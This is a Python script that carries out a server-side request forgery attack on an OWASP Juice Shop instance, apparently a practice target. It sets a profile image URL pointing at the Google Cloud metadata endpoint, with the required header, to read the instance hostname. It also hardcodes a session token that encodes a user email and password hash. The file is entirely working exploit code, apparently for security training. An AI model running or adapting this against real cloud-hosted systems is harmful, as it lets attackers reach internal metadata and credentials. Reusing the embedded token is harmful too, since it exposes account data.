import os
from dotenv import load_dotenv

import requests

load_dotenv()
# Target URL for the Juice Shop profile image endpoint
TARGET_URL = os.getenv("TARGET_URL")
url = f"{TARGET_URL}/profile/image/url"

# Define headers including the user authentication token and the GCP-required flavor header
headers = {
    "Host": "owaspjuiceshop.secureedge.xyz",
    "Cookie": "language=en; token=eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6Mj4sInVzZXJuYW1lIjoiIiwiZW1haWwiOiJ1c2VyMUBleGFtcGxlLmNvbSIsInBhc3N3b3JkIjoiMDE0MDA5YmM3YmU3ZmEyMDkzMGE4N2NjZGE3OWI3ZWMiLCJyb2xlIjoiY3VzdG9tZXIiLCJkZWx1eGVUb2tlbiI6IiIsImxhc3RMb2dpbklwIjoiIiwicHJvZmlsZUltYWdlIjoiL2Fzc2V0cy9wdWJsaWMvaW1hZ2VzL3VwbG9hZHMvZGVmYXVsdC5zdmciLCJ0b3RwU2VjcmV0IjoiIiwiaXNBY3RpdmUiOnRydWUsImNyZWF0ZWRBdCI6IjIwMjYtMDQtMDYgMjA6MDk6MTIuNDgzICswMDowMCIsInVwZGF0ZWRBdCI6IjIwMjYtMDQtMDYgMjA6MDk6MjEuODg5ICswMDowMCIsImRlbGV0ZWRBdCI6bnVsbH0sImlhdCI6MTc3ODA0MzE4NH0.avs_KCY-SHjBEfb80nXQ7FRjc5tC9Z_maQ4Y0rquqAeXDrZoDJvC4w5goW-sAnPcoipyzUpWTIbUEvjthlyuB9Ua6CY8saj5F6ZGC9Db9HwOZuhbS2giGPmu6-ghQUutcdYSexwLU3eVbaEwIiHWJy0rvNDFxLjEdH1m9uNE2tw; welcomebanner_status=dismiss",
    "Content-Type": "application/x-www-form-urlencoded",
    "Origin": f"{TARGET_URL}",
    "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36",
    "Accept": "application/json, text/plain, */*",
    "Referer": f"{TARGET_URL}/profile",
    "Metadata-Flavor": "Google"
}

# Payload to get the GCP instance hostname
payload = {
    "imageUrl": "http://169.254.169.254/computeMetadata/v1/instance/hostname"
}

try:
    # Send the POST request
    response = requests.post(url, headers=headers, data=payload, timeout=10)
    
    print(f"Status Code: {response.status_code}\n")
    print("Response Body:")
    print(response.text)
    
except requests.exceptions.RequestException as e:
    print(f"Error occurred: {e}")